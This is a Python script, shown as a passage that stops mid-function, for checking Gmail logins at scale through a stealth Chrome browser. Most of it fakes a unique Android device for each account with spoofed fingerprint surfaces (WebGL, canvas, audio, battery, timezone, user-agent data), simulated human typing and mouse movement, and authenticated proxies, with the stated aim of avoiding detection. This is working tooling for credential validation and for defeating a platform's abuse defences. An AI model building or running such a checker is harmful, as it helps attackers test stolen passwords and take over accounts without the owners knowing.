#!/usr/bin/env python3
"""
gmail_uc_checker.py — Gmail login checker via undetected-chromedriver
Called by Node.js browserLoginChecker.ts as a child process.

Input  (stdin):  JSON { "email", "password", "totp"?, "proxy"? }
Output (stdout): JSON { "status", "reason", "totpCode", "debugScreenshot"? }
Logs   (stderr): progress lines prefixed with [UC]
"""
import sys
import json
import os
import time
import random
import base64
import zipfile
import io
import subprocess
import tempfile
import fcntl
import socket

# ── Cross-process Chrome launch lock ─────────────────────────────────────────
# Multiple Python processes (one per account) can be spawned concurrently.
# Launching Chrome simultaneously from all of them causes OOM crashes.
# This file lock serializes Chrome launches so only ONE Chrome starts at a time.
# Once Chrome is stable (CDP ready), the lock is released so the next can start.
_CHROME_LAUNCH_LOCK_PATH = "/tmp/gmail_checker_chrome_launch.lock"


def _find_free_port() -> int:
    """Get a random free TCP port for ChromeDriver to bind on."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return s.getsockname()[1]


def _find_free_display() -> int:
    """Find a free X display number by checking Xvfb lock files (/tmp/.XN-lock)."""
    for n in range(100, 300):
        if not os.path.exists(f"/tmp/.X{n}-lock"):
            return n
    return random.randint(300, 399)


# ── Logging ───────────────────────────────────────────────────────────────────

def log(msg: str):
    print(f"[UC] {msg}", file=sys.stderr, flush=True)


# ── Helpers ───────────────────────────────────────────────────────────────────

def rand_sleep(min_ms: int, max_ms: int):
    time.sleep(random.uniform(min_ms / 1000, max_ms / 1000))


def human_type(element, text: str):
    """Type text quickly like a fast human doing copy-paste — 15-40ms per char.
    Simulates ~150-200 WPM typist. Very rare micro-pause (0.5%) to avoid robotic rhythm.
    Re-finds the element if a stale reference is hit."""
    from selenium.common.exceptions import StaleElementReferenceException
    for char in text:
        for _attempt in range(3):
            try:
                element.send_keys(char)
                break
            except StaleElementReferenceException:
                time.sleep(0.15)
        delay = random.uniform(0.015, 0.040)
        if random.random() < 0.005:          # 0.5% chance — very rare thinking pause
            delay += random.uniform(0.06, 0.12)
        time.sleep(delay)


# ── xdotool availability check (cached at module level) ──────────────────────
_XDOTOOL_PATH: str | None = None
_XDOTOOL_CHECKED = False

def _get_xdotool() -> str | None:
    global _XDOTOOL_PATH, _XDOTOOL_CHECKED
    if not _XDOTOOL_CHECKED:
        try:
            p = subprocess.check_output(["which", "xdotool"], encoding="utf8",
                                         stderr=subprocess.DEVNULL).strip()
            _XDOTOOL_PATH = p if p else None
        except Exception:
            _XDOTOOL_PATH = None
        _XDOTOOL_CHECKED = True
    return _XDOTOOL_PATH


def _get_chrome_win_id() -> str | None:
    """Find the Chrome/Chromium window ID via xdotool for targeted typing.
    Returns the window ID string, or None if not found.
    Note: does NOT use --onlyvisible — Xvfb without a window manager never
    marks windows as visible, so --onlyvisible always returns empty."""
    xdt = _get_xdotool()
    if not xdt:
        return None
    display = os.environ.get("DISPLAY", ":0")
    # Try multiple class names — Nix Chromium may register under any of these
    for class_name in ("chromium", "Chromium", "chromium-browser", "google-chrome", "Chrome"):
        try:
            out = subprocess.check_output(
                [xdt, "search", "--class", class_name],
                encoding="utf8", stderr=subprocess.DEVNULL,
                env={**os.environ, "DISPLAY": display},
                timeout=3
            ).strip()
            ids = [i for i in out.splitlines() if i.strip()]
            if ids:
                return ids[-1]  # most recently opened window
        except Exception:
            continue
    return None


def clipboard_type(driver, element, text: str):
    """Simulate clipboard paste — instant text entry like a human Ctrl+V'ing.
    Uses xdotool with explicit Chrome window targeting for authentic key events.
    Falls back to fast send_keys (5–12ms/char ≈ 400 WPM) if xdotool fails or
    if field-value verification shows the text was not actually entered.
    This is the primary typing method — much faster than human_type per character."""
    from selenium.webdriver.common.keys import Keys as _K
    from selenium.common.exceptions import StaleElementReferenceException

    xdt = _get_xdotool()
    display = os.environ.get("DISPLAY", ":0")
    if xdt:
        try:
            # Focus and clear the field first via Selenium
            for _a in range(2):
                try:
                    element.click()
                    element.send_keys(_K.CONTROL + 'a')
                    break
                except Exception:
                    time.sleep(0.05)
            time.sleep(random.uniform(0.03, 0.06))

            # Get Chrome window ID so xdotool types into the right window
            win_id = _get_chrome_win_id()
            xdt_cmd = [xdt, 'type', '--clearmodifiers', '--delay', '0']
            if win_id:
                # Focus the Chrome window explicitly before typing
                subprocess.run(
                    [xdt, 'windowfocus', '--sync', win_id],
                    capture_output=True, timeout=3,
                    env={**os.environ, "DISPLAY": display}
                )
                time.sleep(random.uniform(0.02, 0.04))
                xdt_cmd += ['--window', win_id]
            xdt_cmd += ['--', text]

            result = subprocess.run(
                xdt_cmd, capture_output=True, timeout=10,
                env={**os.environ, "DISPLAY": display}
            )
            if result.returncode == 0:
                time.sleep(random.uniform(0.04, 0.08))
                # Verify the field actually received the text before returning.
                try:
                    val = driver.execute_script("return arguments[0].value;", element) or ""
                    if len(val) >= max(1, len(text) - 2):
                        # Field has the text — xdotool worked
                        return
                    # Field is empty or too short — fall through to send_keys
                    log(f"[clipboard_type] xdotool exit 0 but field value short ({len(val)}/{len(text)}) — using send_keys fallback")
                except Exception:
                    # Can't read value (e.g. password field may block it) — trust xdotool
                    return
            # Non-zero exit or value check failed — fall through to send_keys
        except Exception:
            pass  # fall through to fast send_keys

    # Fallback: fast character-by-character (5–12ms/char ≈ 400+ WPM)
    for char in text:
        for _attempt in range(2):
            try:
                element.send_keys(char)
                break
            except StaleElementReferenceException:
                time.sleep(0.05)
        time.sleep(random.uniform(0.005, 0.012))


def natural_mouse_move(driver, element):
    """Move mouse in a natural curved path to element — overshoot + correction.
    More realistic than straight-line move_to_element. Uses ActionChains offset
    to simulate human hand movement with slight overshoot and course correction."""
    try:
        from selenium.webdriver.common.action_chains import ActionChains
        # Overshoot slightly past the element, pause, then correct to center
        overshoot_x = random.randint(-20, 20)
        overshoot_y = random.randint(-12, 12)
        ac = ActionChains(driver)
        ac.move_to_element_with_offset(element, overshoot_x, overshoot_y)
        ac.pause(random.uniform(0.03, 0.08))
        # Correct to element center
        ac.move_to_element(element)
        ac.pause(random.uniform(0.05, 0.14))
        ac.perform()
    except Exception:
        # Fallback to simple move
        try:
            from selenium.webdriver.common.action_chains import ActionChains
            ActionChains(driver).move_to_element(element).pause(
                random.uniform(0.06, 0.15)).perform()
        except Exception:
            pass


def move_to_element(driver, element):
    """Move mouse naturally to element before interacting (kept for compatibility).
    Delegates to natural_mouse_move for realistic curved path."""
    natural_mouse_move(driver, element)


# ── Phone device profiles — each account gets one assigned randomly ───────────
# Modelled on real flagship Android phones; covers different GPU, screen, memory.
PHONE_PROFILES = [
    # ── Google Pixel ──────────────────────────────────────────────────────────
    {
        "model": "Pixel 6",       "androidVersion": "14",   # Tensor G1
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "ARM", "webglRenderer": "Mali-G78 MP20",
    },
    {
        "model": "Pixel 6a",      "androidVersion": "14",   # Tensor G1
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 6,  "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "ARM", "webglRenderer": "Mali-G78 MP20",
    },
    {
        "model": "Pixel 7",       "androidVersion": "14",   # Tensor G2
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 730",
    },
    {
        "model": "Pixel 7a",      "androidVersion": "14",   # Tensor G2
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "ARM", "webglRenderer": "Mali-G710 MP7",
    },
    {
        "model": "Pixel 8",       "androidVersion": "14",   # Tensor G3
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 915, "availH": 891, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
        "model": "Pixel 8 Pro",   "androidVersion": "14",   # Tensor G3
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 919, "availH": 895, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
        "model": "Pixel 9",       "androidVersion": "15",   # Tensor G4
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 9, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "ARM", "webglRenderer": "Mali-G715 MP7",
    },
    {
        "model": "Pixel 9 Pro",   "androidVersion": "15",   # Tensor G4
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 9, "deviceMemory": 16, "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "ARM", "webglRenderer": "Mali-G715 MP7",
    },
    # ── Samsung Galaxy S-series ───────────────────────────────────────────────
    {
        "model": "SM-G991B",      "androidVersion": "14",   # Samsung Galaxy S21
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 800, "availH": 776, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "ARM", "webglRenderer": "Mali-G78 MP14",
    },
    {
        "model": "SM-S901B",      "androidVersion": "14",   # Samsung Galaxy S22
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 780, "availH": 756, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Samsung Electronics Co., Ltd.", "webglRenderer": "Xclipse 920",
    },
    {
        "model": "SM-S908B",      "androidVersion": "14",   # Samsung Galaxy S22 Ultra
        "chromeVersion": "138.0.7204.100",
        "screenW": 384, "screenH": 854, "availH": 830, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Samsung Electronics Co., Ltd.", "webglRenderer": "Xclipse 920",
    },
    {
        "model": "SM-S911B",      "androidVersion": "14",   # Samsung Galaxy S23
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 773, "availH": 749, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
        "model": "SM-S711B",      "androidVersion": "14",   # Samsung Galaxy S23 FE
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 780, "availH": 756, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Samsung Electronics Co., Ltd.", "webglRenderer": "Xclipse 920",
    },
    {
        "model": "SM-S928B",      "androidVersion": "14",   # Samsung Galaxy S24+
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 780, "availH": 756, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Samsung Electronics Co., Ltd.", "webglRenderer": "Xclipse 940",
    },
    # ── Samsung Galaxy A-series ───────────────────────────────────────────────
    {
        "model": "SM-A536B",      "androidVersion": "14",   # Samsung Galaxy A53
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 800, "availH": 776, "dpr": 2.0,
        "hwConcurrency": 8, "deviceMemory": 6,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "ARM", "webglRenderer": "Mali-G68 MC4",
    },
    {
        "model": "SM-A546B",      "androidVersion": "14",   # Samsung Galaxy A54
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 800, "availH": 776, "dpr": 2.0,
        "hwConcurrency": 8, "deviceMemory": 6,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "ARM", "webglRenderer": "Mali-G68",
    },
    {
        "model": "SM-A346B",      "androidVersion": "14",   # Samsung Galaxy A34
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 800, "availH": 776, "dpr": 2.0,
        "hwConcurrency": 8, "deviceMemory": 6,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "ARM", "webglRenderer": "Mali-G68",
    },
    {
        "model": "SM-A736B",      "androidVersion": "14",   # Samsung Galaxy A73
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 800, "availH": 776, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 642L",
    },
    # ── OnePlus ───────────────────────────────────────────────────────────────
    {
        "model": "CPH2423",       "androidVersion": "14",   # OnePlus 11
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 919, "availH": 895, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
        "model": "CPH2447",       "androidVersion": "14",   # OnePlus 12
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 919, "availH": 895, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 750",
    },
    {
        "model": "CPH2493",       "androidVersion": "14",   # OnePlus Nord 3
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 919, "availH": 895, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "ARM", "webglRenderer": "Mali-G710 MC10",
    },
    # ── Xiaomi / Redmi ────────────────────────────────────────────────────────
    {
        "model": "2211133G",      "androidVersion": "14",   # Xiaomi 13
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
        "model": "23049PCD8G",    "androidVersion": "14",   # Xiaomi 14
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 750",
    },
    {
        "model": "23078PND5G",    "androidVersion": "14",   # Xiaomi 13T Pro
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "ARM", "webglRenderer": "Mali-G715 MC11",
    },
    {
        "model": "22101316G",     "androidVersion": "13",   # Redmi Note 12 Pro
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "ARM", "webglRenderer": "Mali-G68 MC4",
    },
    # ── Others ────────────────────────────────────────────────────────────────
    {
        "model": "RMX3706",       "androidVersion": "14",   # Realme GT 5
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
        "model": "A065",          "androidVersion": "14",   # Nothing Phone 2
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 730",
    },
    {
        "model": "XT2303-2",      "androidVersion": "14",   # Motorola Edge 40
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "ARM", "webglRenderer": "Mali-G77 MC9",
    },
    {
        "model": "V2246",         "androidVersion": "14",   # Vivo V29
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 642L",
    },
    {
        "model": "PGEM10",        "androidVersion": "14",   # Oppo Find X6
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv81",
        "webglVendor": "ARM", "webglRenderer": "Mali-G715 MC11",
    },
]


def get_or_create_fingerprint(profile_dir: str) -> dict:
    """Load the saved fingerprint for this profile, or generate & save a new one.
    This makes every account look like a consistent, unique device — same as
    antidetect/cloner behaviour."""
    fp_path = os.path.join(profile_dir, "fingerprint.json")
    if os.path.exists(fp_path):
        try:
            with open(fp_path, "r") as f:
                existing = json.load(f)
            if all(k in existing for k in ("model", "screenW", "canvasSeed")):
                return existing
        except Exception:
            pass
    fp = random.choice(PHONE_PROFILES).copy()
    fp["canvasSeed"]  = random.randint(1, 254)        # unique canvas XOR per account
    fp["audioNoise"]  = round(random.uniform(0.00001, 0.00009), 7)  # unique audio shift
    # Per-account timezone — each account looks like a different person in a different city
    fp["timezone"] = random.choice([
        "America/New_York", "America/Chicago", "America/Los_Angeles",
        "America/Denver", "America/Toronto", "America/Vancouver",
        "Europe/London", "Europe/Paris", "Europe/Berlin", "Europe/Madrid",
        "Europe/Rome", "Europe/Amsterdam", "Europe/Warsaw",
        "Asia/Calcutta", "Asia/Tokyo", "Asia/Seoul", "Asia/Singapore",
        "Asia/Dubai", "Asia/Bangkok", "Asia/Jakarta", "Asia/Hong_Kong",
        "Australia/Sydney", "Australia/Melbourne",
    ])
    # Per-account language — varies the Accept-Language header and navigator.languages
    fp["language"] = random.choice([
        "en-US", "en-US", "en-US", "en-US",  # weighted — most users are en-US
        "en-GB", "en-CA", "en-AU", "en-IN",
    ])
    # ── App-cloner style: every account has its own unique device identity ────
    # Battery — real phones vary; always discharging (mobile check, plugged-in is rare)
    fp["batteryLevel"]    = round(random.uniform(0.15, 0.94), 2)
    fp["batteryCharging"] = False  # mobile users rarely plugged in while browsing
    # Do Not Track — vary per account (most users leave it off)
    fp["doNotTrack"] = random.choice([None, None, None, "1", "unspecified"])
    # Network connection — stable values per account (not randomised per page)
    fp["connectionRtt"]      = random.randint(35, 95)
    fp["connectionDownlink"] = round(random.uniform(7.5, 15.0), 1)
    # Browser history depth — simulates an account that has been used before
    fp["historyLength"] = random.randint(3, 14)
    # Unique WebGL noise per account (shifts float precision slightly)
    fp["webglNoise"] = round(random.uniform(0.000001, 0.000009), 8)
    try:
        with open(fp_path, "w") as f:
            json.dump(fp, f, indent=2)
    except Exception:
        pass
    return fp


def make_stealth_js(fp: dict) -> str:
    """Build the CDP stealth script with values from this account's fingerprint.
    Covers every modern fingerprinting surface: canvas, audio, WebGL, navigator,
    screen, connection, battery, timezone, UA-CH — all unique per account (app-cloner style)."""
    cs   = fp["canvasSeed"]
    an   = fp["audioNoise"]
    wv   = fp["webglVendor"].replace("'", "\\'")
    wr   = fp["webglRenderer"].replace("'", "\\'")
    cv   = fp["chromeVersion"]
    av   = fp["androidVersion"]
    mdl  = fp["model"].replace("'", "\\'")
    tz   = fp.get("timezone", "America/New_York").replace("'", "\\'")
    lg   = fp.get("language", "en-US").replace("'", "\\'")
    bat  = fp.get("batteryLevel", 0.72)
    bchg = "true" if fp.get("batteryCharging", False) else "false"
    dnt  = fp.get("doNotTrack")
    dnt_val = f"'{dnt}'" if dnt else "null"
    rtt  = fp.get("connectionRtt", 65)
    dl   = fp.get("connectionDownlink", 10.5)
    hist = fp.get("historyLength", 5)
    wn   = fp.get("webglNoise", 0.000002)
    return f"""
Object.defineProperty(navigator,'webdriver',{{get:()=>undefined}});
Object.defineProperty(navigator,'plugins',{{get:()=>{{var p=[];p.length=0;return p;}}}});
Object.defineProperty(navigator,'languages',{{get:()=>['{lg}','en']}});
Object.defineProperty(navigator,'hardwareConcurrency',{{get:()=>{fp['hwConcurrency']}}});
Object.defineProperty(navigator,'deviceMemory',{{get:()=>{fp['deviceMemory']}}});
Object.defineProperty(navigator,'cookieEnabled',{{get:()=>true}});
Object.defineProperty(navigator,'doNotTrack',{{get:()=>{dnt_val}}});
try{{Object.defineProperty(navigator,'globalPrivacyControl',{{get:()=>undefined}});}}catch(e){{}}
Object.defineProperty(screen,'width',      {{get:()=>{fp['screenW']}}});
Object.defineProperty(screen,'height',     {{get:()=>{fp['screenH']}}});
Object.defineProperty(screen,'availWidth', {{get:()=>{fp['screenW']}}});
Object.defineProperty(screen,'availHeight',{{get:()=>{fp['availH']}}});
Object.defineProperty(screen,'colorDepth', {{get:()=>24}});
Object.defineProperty(screen,'pixelDepth', {{get:()=>24}});
try{{Object.defineProperty(screen,'isExtended',{{get:()=>false}});}}catch(e){{}}
Object.defineProperty(window,'devicePixelRatio',{{get:()=>{fp['dpr']}}});
Object.defineProperty(window,'innerWidth',  {{get:()=>{fp['screenW']}}});
Object.defineProperty(window,'innerHeight', {{get:()=>{fp['availH']}}});
Object.defineProperty(navigator,'maxTouchPoints',{{get:()=>{fp['maxTouchPoints']}}});
Object.defineProperty(navigator,'platform',{{get:()=>'{fp['platform']}'}});
Object.defineProperty(navigator,'vendor',  {{get:()=>'Google Inc.'}});
try{{Object.defineProperty(window.history,'length',{{get:()=>{hist},configurable:true}});}}catch(e){{}}
(function(){{
  var d={{brands:[{{brand:'Not=A?Brand',version:'24'}},{{brand:'Chromium',version:'138'}},{{brand:'Google Chrome',version:'138'}}],mobile:true,platform:'Android',
    getHighEntropyValues:function(h){{return Promise.resolve({{brands:this.brands,mobile:this.mobile,platform:this.platform,platformVersion:'{av}',architecture:'',bitness:'',model:'{mdl}',uaFullVersion:'{cv}',fullVersionList:[{{brand:'Not=A?Brand',version:'24.0.0.0'}},{{brand:'Chromium',version:'{cv}'}},{{brand:'Google Chrome',version:'{cv}'}}]}});}},
    toJSON:function(){{return{{brands:this.brands,mobile:this.mobile,platform:this.platform}};}}}};
  try{{Object.defineProperty(navigator,'userAgentData',{{get:()=>d}});}}catch(e){{}}
}})();
(function(){{
  if(!window.chrome)window.chrome={{}};
  if(!window.chrome.runtime){{
    window.chrome.runtime={{
      connect:function(){{}},sendMessage:function(){{}},
      onMessage:{{addListener:function(){{}},removeListener:function(){{}}}},
      onConnect:{{addListener:function(){{}},removeListener:function(){{}}}},
      PlatformOs:{{ANDROID:'android'}},id:undefined
    }};
  }}
  try{{delete window.chrome.app;}}catch(e){{}}
  if(!window.chrome.loadTimes)window.chrome.loadTimes=function(){{return{{requestTime:Date.now()/1000-0.5,startLoadTime:Date.now()/1000-0.5,commitLoadTime:Date.now()/1000-0.3,finishDocumentLoadTime:Date.now()/1000-0.1,finishLoadTime:Date.now()/1000,firstPaintTime:0,firstPaintAfterLoadTime:0,navigationType:'Other',wasFetchedViaSpdy:false,wasNpnNegotiated:false,npnNegotiatedProtocol:'',wasAlternateProtocolAvailable:false,connectionInfo:''}}}};
  if(!window.chrome.csi)window.chrome.csi=function(){{return{{startE:Date.now()-1000,onloadT:Date.now()-500,pageT:500,tran:15}}}};
}})();
if(window.Notification){{Object.defineProperty(Notification,'permission',{{get:()=>'default'}});}}
try{{
  if(navigator.permissions&&navigator.permissions.query){{
    var _origPQ=navigator.permissions.query.bind(navigator.permissions);
    navigator.permissions.query=function(p){{
      if(p&&p.name==='notifications')return Promise.resolve({{state:Notification.permission,onchange:null}});
      return _origPQ(p);
    }};
  }}
}}catch(e){{}}
try{{
  navigator.getBattery&&navigator.getBattery().then(function(b){{
    try{{Object.defineProperty(b,'charging',{{get:()=>{bchg}}});}}catch(e){{}}
    try{{Object.defineProperty(b,'level',{{get:()=>{bat}}});}}catch(e){{}}
    try{{Object.defineProperty(b,'chargingTime',{{get:()=>{bchg}?0:Infinity}});}}catch(e){{}}
    try{{Object.defineProperty(b,'dischargingTime',{{get:()=>Math.floor(3600+Math.random()*7200)}});}}catch(e){{}}
  }});
}}catch(e){{}}
window.ontouchstart=function(){{}};
try{{Object.defineProperty(screen,'orientation',{{get:()=>({{{{'type':'portrait-primary','angle':0}}}})}}); }}catch(e){{}}
try{{
  var conn={{'effectiveType':'4g','rtt':{rtt},'downlink':{dl},'saveData':false,'type':'cellular','onchange':null}};
  Object.defineProperty(navigator,'connection',{{get:()=>conn}});
  Object.defineProperty(navigator,'mozConnection',{{get:()=>undefined}});
  Object.defineProperty(navigator,'webkitConnection',{{get:()=>undefined}});
}}catch(e){{}}
try{{Object.defineProperty(navigator,'keyboard',{{get:()=>undefined}});}}catch(e){{}}
(function(){{
  var _wn={wn};
  function patch(ctx){{
    var gp=ctx.prototype.getParameter;
    ctx.prototype.getParameter=function(p){{
      if(p===37445)return'{wv}';
      if(p===37446)return'{wr}';
      var v=gp.call(this,p);
      if(typeof v==='number')return v+_wn*Math.sign(v||1);
      return v;
    }};
  }}
  patch(WebGLRenderingContext);
  if(window.WebGL2RenderingContext)patch(WebGL2RenderingContext);
}})();
(function(){{
  var seed={cs};
  var o=HTMLCanvasElement.prototype.toDataURL;
  HTMLCanvasElement.prototype.toDataURL=function(t){{var c=this.getContext('2d');if(c){{var d=c.getImageData(0,0,this.width||1,this.height||1);d.data[0]=d.data[0]^seed;c.putImageData(d,0,0);}}return o.apply(this,arguments);}};
  var og=CanvasRenderingContext2D.prototype.getImageData;
  CanvasRenderingContext2D.prototype.getImageData=function(){{var d=og.apply(this,arguments);if(d&&d.data.length>0)d.data[0]=d.data[0]^seed;return d;}};
}})();
(function(){{
  var noise={an};
  var orig=AudioBuffer&&AudioBuffer.prototype.getChannelData;
  if(orig)AudioBuffer.prototype.getChannelData=function(){{
    var d=orig.apply(this,arguments);
    if(d&&d.length>0){{try{{d[0]=d[0]+noise;}}catch(e){{}}}}
    return d;
  }};
}})();
try{{var _tz='{tz}';var _dto=Intl.DateTimeFormat;function _dtow(l,o){{o=o||{{}};if(!o.timeZone)o.timeZone=_tz;return new _dto(l,o);}}try{{Object.keys(_dto).forEach(function(k){{_dtow[k]=_dto[k];}});}}catch(e2){{}}try{{_dtow.prototype=_dto.prototype;}}catch(e3){{}}Intl.DateTimeFormat=_dtow;}}catch(e){{}}
"""


def get_chromium_path() -> str | None:
    for cmd in ("chromium", "chromium-browser", "google-chrome"):
        try:
            p = subprocess.check_output(["which", cmd], encoding="utf8", stderr=subprocess.DEVNULL).strip()
            if p:
                return p
        except Exception:
            pass
    nix = "/nix/store/qa9cnw4v5xkxyip6mb9kxqfq1z4x2dx1-chromium-138.0.7204.100/bin/chromium"
    if os.path.exists(nix):
        return nix
    return None


def parse_proxy(proxy_url: str) -> dict | None:
    try:
        from urllib.parse import urlparse
        p = urlparse(proxy_url)
        return {
            "scheme": p.scheme or "http",
            "host": p.hostname,
            "port": p.port or 3128,
            "username": p.username,
            "password": p.password,
        }
    except Exception:
        return None


def make_proxy_extension(host: str, port: int, username: str, password: str) -> str:
    """
    Build a Manifest-V2 Chrome extension zip that handles proxy auth.
    Returns the path to the zip file (caller must delete it).
    """
    manifest = json.dumps({
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Proxy Auth",
        "permissions": [
            "proxy", "tabs", "unlimitedStorage", "storage",
            "<all_urls>", "webRequest", "webRequestBlocking"
        ],
        "background": {"scripts": ["background.js"]},
        "minimum_chrome_version": "22.0.0"
    })
    background_js = f"""
var config = {{
    mode: "fixed_servers",
    rules: {{
        singleProxy: {{ scheme: "http", host: {json.dumps(host)}, port: parseInt("{port}") }},
        bypassList: ["localhost"]
    }}
}};
chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
function callbackFn(details) {{
    return {{ authCredentials: {{ username: {json.dumps(username)}, password: {json.dumps(password)} }} }};
}}
chrome.webRequest.onAuthRequired.addListener(callbackFn, {{urls: ["<all_urls>"]}}, ["blocking"]);
"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("manifest.json", manifest)
        z.writestr("background.js", background_js)
    buf.seek(0)

    fd, path = tempfile.mkstemp(suffix=".zip", prefix="vanguard_proxy_")
    os.close(fd)
    with open(path, "wb") as f:
        f.write(buf.read())
    return path


def generate_totp(secret: str) -> str | None:
    try:
        import pyotp
